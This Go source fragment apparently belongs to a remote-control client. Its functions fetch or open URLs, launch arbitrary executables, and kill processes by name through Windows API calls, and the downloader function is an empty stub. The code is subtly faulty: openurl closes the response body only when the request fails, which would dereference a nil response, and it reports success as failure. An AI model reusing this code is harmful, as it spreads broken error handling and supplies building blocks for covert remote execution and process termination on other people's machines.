package components

import (
	"net/http"
	"os/exec"
	"strings"
)

func downloader(mode string, content string, md5 string, params string) {
	if mode == "0" {

	}
}

func openurl(url string, mode string) bool {
	var err error
	if mode == "0" {
		var resp *http.Response
		resp, err = http.Get(url)
		if err != nil {
			defer resp.Body.Close()
		}
	} else {
		err = exec.Command("cmd", "/c", "start", url).Start()
	}
	return err != nil
}

func start_exe(name string) bool {
	if strings.Contains(name, ".exe") {
		var final_name string
		binary, err := exec.LookPath(name)
		if err != nil {
			final_name = name
		} else {
			final_name = binary
		}
		return exec.Command(final_name).Start() == nil
	}
	return false
}

func kill(name string) bool {
	pid := find_pid_by_name(name)
	if pid == 0 {
		return false
	}
	hProcess, _, _ := pfnOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
	if hProcess == 0 {
		return false
	}
	ret, _, _ := pfnTerminateProcess.Call(hProcess, 0)

	return ret != 0
}
